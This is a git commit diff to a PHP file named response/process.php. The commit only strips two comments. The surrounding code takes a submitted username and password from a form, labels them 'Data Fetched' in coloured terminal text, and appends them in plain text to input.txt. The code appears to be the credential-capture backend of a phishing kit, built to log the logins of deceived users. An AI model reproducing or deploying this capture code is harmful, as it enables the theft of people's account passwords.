404c5be706c8f8d9ff0897d2d56295ca24ce890e
Uthman Dev <149274873+codetesla51@users.noreply.github.com>
2024-10-21 09:11:57 +0100

    Update process.php

--- response/process.php
+++ response/process.php
@@ -2,10 +2,10 @@
       $user_name = $_POST["user_name"];
       $user_pass = $_POST["password"];
 
-      // Concatenate user data properly
+    
       $data = "Data Fetched \n";
-      $data .= "\033[35mUsername: $user_name\n\033[0m"; // Purple username
-      $data .= "\033[35mPassword: $user_pass\n\033[0m"; // Purple password
+      $data .= "\033[35mUsername: $user_name\n\033[0m"; 
+      $data .= "\033[35mPassword: $user_pass\n\033[0m"; 
       $data .= "-------------------------------------\n";
       // Write the data to input.txt
       $input_file = "input.txt";
